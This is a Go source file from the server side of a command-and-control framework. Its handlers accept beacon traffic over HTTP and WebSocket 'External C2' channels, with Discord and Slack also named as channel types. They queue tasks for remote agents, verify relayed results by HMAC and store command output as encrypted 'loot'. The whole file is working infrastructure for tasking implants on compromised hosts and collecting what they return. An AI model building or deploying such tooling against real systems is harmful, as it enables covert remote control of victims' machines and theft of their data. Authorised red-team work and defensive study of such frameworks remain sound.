package server

import (
	"crypto/hmac"
	"crypto/sha256"
	"crypto/subtle"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/crypto"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

type extC2ReceiveRequest struct {
	BeaconID string `json:"beacon_id"`
	Raw      string `json:"raw"` // base64-encoded raw beacon data
}

type extC2ReceiveResponse struct {
	Success bool   `json:"success"`
	Data    string `json:"data,omitempty"` // base64-encoded response
	Error   string `json:"error,omitempty"`
}

type extC2SendRequest struct {
	BeaconID string `json:"beacon_id"`
	Data     string `json:"data"` // base64-encoded response data
}

type extC2SendResponse struct {
	Success bool   `json:"success"`
	Error   string `json:"error,omitempty"`
}

func (s *Server) checkExtC2Token(c *gin.Context) bool {
	s.configMu.RLock()
	token := s.cfg.RateLimit.ExtC2.APIToken
	s.configMu.RUnlock()
	if token == "" {
		c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"success": false, "error": "extc2 token not configured"})
		return false
	}
	headerToken := c.GetHeader("X-ExtC2-Token")
	if headerToken == "" {
		headerToken = c.GetHeader("Authorization")
	}
	if subtle.ConstantTimeCompare([]byte(headerToken), []byte(token)) != 1 {
		c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"success": false, "error": "unauthorized"})
		return false
	}
	return true
}

func (s *Server) handleExtC2Receive(c *gin.Context) {
	if !s.checkExtC2Token(c) {
		return
	}
	c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, MaxJSONBodySize)
	var req extC2ReceiveRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, extC2ReceiveResponse{Error: "Invalid request"})
		return
	}

	slog.Info("External C2 receive", "beacon_id", req.BeaconID, "raw_len", len(req.Raw))

	raw, err := base64.StdEncoding.DecodeString(req.Raw)
	if err != nil {
		c.JSON(http.StatusBadRequest, extC2ReceiveResponse{Error: sanitizeError(err, "Base64 decode")})
		return
	}

	// The raw payload is a full v2 beacon envelope, exactly like the HTTP
	// beacon body. Run it through the complete envelope gate (ECDH AEAD with
	// AAD-bound UUID+seq, replay window, timestamp tolerance) instead of
	// trusting an opaque JSON blob — otherwise a holder of the shared
	// X-ExtC2-Token could impersonate arbitrary agents and inject results or
	// drain queued tasks. BeaconID is intentionally NOT applied: the agent
	// identity comes from the authenticated envelope and cannot be spoofed.
	env, br, kind := s.decodeBeaconEnvelope(raw)
	if kind == frameRejected {
		// Resync rides the normal base64 data channel back to the beacon.
		if body, ok := s.resyncResponseFor(env); ok {
			respJSON, err := json.Marshal(struct {
				Success bool   `json:"success"`
				Data    string `json:"data"`
			}{Success: true, Data: base64.StdEncoding.EncodeToString(body)})
			if err != nil {
				c.JSON(http.StatusInternalServerError, extC2ReceiveResponse{Error: sanitizeError(err, "Response encoding")})
				return
			}
			c.Data(http.StatusOK, "application/json", respJSON)
			return
		}
		c.JSON(http.StatusUnauthorized, extC2ReceiveResponse{Error: "invalid beacon envelope"})
		return
	}

	var respBytes []byte
	if kind == frameEncrypted {
		resp := s.processBeacon(br, "")
		if s.sessionManager != nil && s.sessionManager.NeedsRekey(br.UUID, BeaconSessionRekeyMessages) {
			resp.Rekey = true
		}
		var ok bool
		respBytes, ok = s.buildBeaconResponse(br.UUID, env.Seq, resp)
		if !ok {
			c.JSON(http.StatusInternalServerError, extC2ReceiveResponse{Error: "response build failed"})
			return
		}
	} else {
		var ok bool
		respBytes, ok = s.processAuthFrame(env, kind)
		if !ok {
			c.JSON(http.StatusUnauthorized, extC2ReceiveResponse{Error: "authentication failed"})
			return
		}
	}

	respJSON, err := json.Marshal(struct {
		Success bool   `json:"success"`
		Data    string `json:"data"`
	}{Success: true, Data: base64.StdEncoding.EncodeToString(respBytes)})
	if err != nil {
		c.JSON(http.StatusInternalServerError, extC2ReceiveResponse{Error: sanitizeError(err, "Response encoding")})
		return
	}

	c.Data(http.StatusOK, "application/json", respJSON)
}

func (s *Server) handleExtC2Send(c *gin.Context) {
	if !s.checkExtC2Token(c) {
		return
	}
	c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, MaxJSONBodySize)
	body, err := io.ReadAll(c.Request.Body)
	if err != nil {
		c.JSON(http.StatusBadRequest, extC2SendResponse{Error: sanitizeError(err, "Read request")})
		return
	}

	var req extC2SendRequest
	if err := json.Unmarshal(body, &req); err != nil {
		c.JSON(http.StatusBadRequest, extC2SendResponse{Error: sanitizeError(err, "Parse request")})
		return
	}

	if req.BeaconID == "" {
		c.JSON(http.StatusBadRequest, extC2SendResponse{Error: "beacon_id is required"})
		return
	}

	slog.Info("External C2 send", "beacon_id", req.BeaconID, "data_len", len(req.Data))

	s.extC2ChannelsMu.Lock()
	channelIDs := make([]string, 0, len(s.extC2Channels))
	for id := range s.extC2Channels {
		channelIDs = append(channelIDs, id)
	}
	s.extC2ChannelsMu.Unlock()

	if len(channelIDs) == 0 {
		c.JSON(http.StatusServiceUnavailable, extC2SendResponse{Error: "no active extc2 channels"})
		return
	}

	for _, channelID := range channelIDs {
		s.QueueExtC2Task(channelID, extC2Task{
			AgentID: req.BeaconID,
			Type:    "send",
			Command: req.Data,
		})
	}

	c.JSON(http.StatusOK, extC2SendResponse{Success: true})
}

// --- WebSocket External C2 ---

type extC2WSChannel struct {
	ID        string
	Type      string // "websocket", "discord", "slack"
	Conn      *websocket.Conn
	CreatedAt time.Time
	mu        sync.Mutex
}

func (ch *extC2WSChannel) SendJSON(v interface{}) error {
	ch.mu.Lock()
	defer ch.mu.Unlock()
	if ch.Conn == nil {
		return fmt.Errorf("connection closed")
	}
	ch.Conn.SetWriteDeadline(time.Now().Add(ExtC2WriteTimeout))
	return ch.Conn.WriteJSON(v)
}

type extC2ChannelInfo struct {
	ID        string `json:"id"`
	Type      string `json:"type"`
	CreatedAt string `json:"created_at"`
}

type extC2WSMessage struct {
	AgentID  string `json:"agent_id"`
	Type     string `json:"type"` // "task" or "result"
	TaskID   uint   `json:"task_id,omitempty"`
	ResultID string `json:"result_id,omitempty"`
	Result   string `json:"result,omitempty"`
	HMAC     string `json:"hmac,omitempty"` // hex HMAC-SHA256(extc2_key, agent|task|rid|result) for relayed results
}

type extC2Task struct {
	AgentID string `json:"agent_id"`
	Type    string `json:"type"`
	Command string `json:"command"`
}

func (s *Server) handleExternalC2WebSocket(c *gin.Context) {
	if !s.checkExtC2Token(c) {
		return
	}
	conn, err := s.wsUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("External C2 WebSocket upgrade failed", "error", err)
		return
	}
	defer conn.Close()

	channelID := fmt.Sprintf("extc2-ws-%d", time.Now().UnixNano())
	ch := &extC2WSChannel{
		ID:        channelID,
		Type:      "websocket",
		Conn:      conn,
		CreatedAt: time.Now(),
	}
	s.extC2ChannelsMu.Lock()
	s.extC2Channels[channelID] = ch
	s.extC2ChannelsMu.Unlock()

	s.extC2TaskMu.Lock()
	s.extC2Notify[channelID] = make(chan struct{}, 1)
	s.extC2TaskMu.Unlock()

	defer func() {
		s.extC2ChannelsMu.Lock()
		delete(s.extC2Channels, channelID)
		s.extC2ChannelsMu.Unlock()
		s.extC2TaskMu.Lock()
		delete(s.extC2Notify, channelID)
		// Drop the orphaned queue too: without this every reconnected
		// channel leaks its undelivered tasks map entry forever.
		delete(s.extC2TaskQueue, channelID)
		s.extC2TaskMu.Unlock()
	}()

	slog.Info("External C2 WebSocket connected", "channel_id", channelID)

	// Send task queue reader in a goroutine (push-based via notify channel)
	done := make(chan struct{})
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			// Snapshot the notify channel under the lock: the map is written
			// by other goroutines (QueueExtC2Task, channel cleanup), so reading
			// it here without the lock races a concurrent map read/write.
			s.extC2TaskMu.Lock()
			notifyCh := s.extC2Notify[channelID]
			s.extC2TaskMu.Unlock()
			select {
			case <-done:
				return
			case <-notifyCh:
			case <-ticker.C:
			}
			s.extC2TaskMu.Lock()
			tasks := s.extC2TaskQueue[channelID]
			s.extC2TaskQueue[channelID] = nil
			s.extC2TaskMu.Unlock()
			for i, task := range tasks {
				msg, ok := marshalJSONSafe(task)
				if !ok {
					continue
				}
				// A failed send must not silently eat the task: the queue
				// was already drained above, so requeue this and the rest
				// at the head for the next tick instead of losing them.
				if err := ch.SendJSON(json.RawMessage(msg)); err != nil {
					slog.Warn("External C2 WebSocket send failed, requeueing", "channel_id", channelID, "error", err)
					s.requeueExtC2Tasks(channelID, tasks[i:])
					break
				}
			}
		}
	}()

	// Read loop: receive results from external agent
	conn.SetReadLimit(WSMaxMessageSize)
	for {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		_, msg, err := conn.ReadMessage()
		if err != nil {
			slog.Info("External C2 WebSocket disconnected", "channel_id", channelID, "error", err)
			break
		}

		var extMsg extC2WSMessage
		if json.Unmarshal(msg, &extMsg) != nil {
			continue
		}

		if extMsg.Type == "result" {
			s.processExternalC2Result(extMsg.AgentID, extMsg.TaskID, extMsg.ResultID, extMsg.Result)
		} else if extMsg.Type == "task_request" {
			// Agent is requesting its next task — respond immediately
			s.extC2TaskMu.Lock()
			if len(s.extC2TaskQueue[channelID]) > 0 {
				task := s.extC2TaskQueue[channelID][0]
				s.extC2TaskQueue[channelID] = s.extC2TaskQueue[channelID][1:]
				s.extC2TaskMu.Unlock()
				_ = ch.SendJSON(task) // dead channel: the read deadline below reaps it
			} else {
				s.extC2TaskMu.Unlock()
				_ = ch.SendJSON(map[string]string{"type": "noop"})
			}
		}
	}
	close(done)
}

// extC2ResultMAC computes the hex HMAC-SHA256 that must accompany task
// results relayed through third-party channels (Discord/Slack). Binding:
// agentID|taskID|resultID|result, keyed by crypto.extc2_key.
func extC2ResultMAC(key, agentID string, taskID uint, resultID, result string) string {
	mac := hmac.New(sha256.New, []byte(key))
	fmt.Fprintf(mac, "%s|%d|%s|%s", agentID, taskID, resultID, result)
	return hex.EncodeToString(mac.Sum(nil))
}

// verifyExtC2ResultHMAC gates relayed results: with extc2_key configured,
// only messages carrying a valid tag are accepted, so anyone who can post in
// the channel cannot forge operator-visible task output. An empty key now
// FAILS CLOSED (approved semantic change): every ExtC2 Start() refuses to
// run without it, so reaching here keyless means misconfiguration.
func (s *Server) verifyExtC2ResultHMAC(agentID string, taskID uint, resultID, result, macHex string) bool {
	key := ""
	if s.cfg != nil {
		// Hot reload writes cfg fields under configMu; read under the same
		// lock to avoid a data race with a live channel verifying results.
		s.configMu.RLock()
		key = s.cfg.Crypto.ExtC2Key
		s.configMu.RUnlock()
	}
	if strings.TrimSpace(key) == "" {
		return false
	}
	expected := extC2ResultMAC(key, agentID, taskID, resultID, result)
	return subtle.ConstantTimeCompare([]byte(expected), []byte(strings.ToLower(strings.TrimSpace(macHex)))) == 1
}

// processExternalC2Result applies a result delivered over an ExtC2 WebSocket
// channel. It mirrors the guards enforced by processTaskResults on the beacon
// path: the task must exist and belong to the claimed agent, cancelled tasks
// are terminal, already-finalised results are dropped (durable idempotency via
// last_result_id when the channel supplies one), and only pending/running
// tasks may be completed.
func (s *Server) processExternalC2Result(agentID string, taskID uint, resultID string, result string) {
	if taskID == 0 {
		return
	}
	var task db.Task
	if err := s.db.Where("id = ? AND agent_id = ?", taskID, agentID).First(&task).Error; err != nil {
		slog.Warn("ExtC2 result for unknown task or wrong agent dropped", "task_id", taskID, "agent_id", agentID)
		return
	}
	// Finality guard: a cancelled task is terminal. The result must not
	// resurrect the task row.
	if task.Status == "cancelled" {
		slog.Warn("ExtC2 result for cancelled task dropped", "task_id", taskID, "agent_id", agentID)
		return
	}
	// Durable idempotency: skip results already applied to a finalised task.
	if task.Status == "completed" || task.Status == "failed" {
		slog.Warn("Duplicate extc2 result dropped for finalised task", "task_id", taskID, "agent_id", agentID, "status", task.Status)
		return
	}
	// Only claimed work can be completed by a result.
	if task.Status != "pending" && task.Status != "running" {
		slog.Warn("ExtC2 result skipped, task not in claimable state", "task_id", taskID, "agent_id", agentID, "status", task.Status)
		return
	}
	// Encrypt result at rest (H3) so command output is not stored as plaintext.
	// Fail-closed like the beacon path (encryptTaskFieldsOrBlank): on vault
	// failure the output is dropped and replaced with a marker, never stored
	// as plaintext. A silent plaintext store would leak command output into
	// the DB with a "completed" status and no error anywhere.
	enc, encErr := crypto.EncryptLoot(result)
	if encErr != nil {
		slog.Error("ExtC2 result encryption failed, dropping output", "task_id", taskID, "agent_id", agentID, "err", encErr)
		s.vaultNoteError("encrypt-extc2-result", encErr, task.ID, agentID)
		result = ""
	} else {
		result = enc
	}
	updates := map[string]interface{}{
		"status":     "completed",
		"result":     result,
		"updated_at": time.Now(),
	}
	if encErr != nil {
		updates["error"] = "vault encryption unavailable"
	}
	if resultID != "" {
		updates["last_result_id"] = resultID
	}
	res := s.db.Model(&db.Task{}).Where("id = ? AND agent_id = ? AND status IN ?", task.ID, agentID, []string{"pending", "running"}).Updates(updates)
	if res.Error != nil {
		slog.Error("Failed to update task result from extc2", "task_id", taskID, "agent_id", agentID, "err", res.Error)
		return
	}
	if res.RowsAffected == 0 {
		slog.Warn("ExtC2 result skipped, task state changed concurrently", "task_id", taskID, "agent_id", agentID)
		return
	}
	slog.Info("External C2 result processed", "agent_id", agentID, "task_id", taskID)
}

func (s *Server) handleListExtC2Channels(c *gin.Context) {
	s.extC2ChannelsMu.Lock()
	defer s.extC2ChannelsMu.Unlock()

	channels := make([]extC2ChannelInfo, 0, len(s.extC2Channels))
	for _, ch := range s.extC2Channels {
		channels = append(channels, extC2ChannelInfo{
			ID:        ch.ID,
			Type:      ch.Type,
			CreatedAt: ch.CreatedAt.Format(time.RFC3339),
		})
	}
	respond(c, gin.H{"channels": channels})
}

func (s *Server) QueueExtC2Task(channelID string, task extC2Task) {
	s.extC2TaskMu.Lock()
	defer s.extC2TaskMu.Unlock()
	queue := s.extC2TaskQueue[channelID]
	if len(queue) >= MaxExtC2QueuePerChan {
		slog.Warn("ExtC2 task queue full, dropping oldest task", "channel", channelID, "limit", MaxExtC2QueuePerChan)
		queue = queue[1:]
	}
	s.extC2TaskQueue[channelID] = append(queue, task)
	if ch, ok := s.extC2Notify[channelID]; ok {
		select {
		case ch <- struct{}{}:
		default:
		}
	}
}

// requeueExtC2Tasks prepends unsent tasks back to the head of a channel
// queue (bounded like QueueExtC2Task) so a failed push redelivers instead
// of silently losing tasks the sender already drained.
func (s *Server) requeueExtC2Tasks(channelID string, tasks []extC2Task) {
	if len(tasks) == 0 {
		return
	}
	s.extC2TaskMu.Lock()
	defer s.extC2TaskMu.Unlock()
	queue := append(tasks, s.extC2TaskQueue[channelID]...)
	if len(queue) > MaxExtC2QueuePerChan {
		slog.Warn("ExtC2 requeue over cap, dropping oldest tasks", "channel", channelID, "dropped", len(queue)-MaxExtC2QueuePerChan)
		queue = queue[len(queue)-MaxExtC2QueuePerChan:]
	}
	s.extC2TaskQueue[channelID] = queue
	if ch, ok := s.extC2Notify[channelID]; ok {
		select {
		case ch <- struct{}{}:
		default:
		}
	}
}
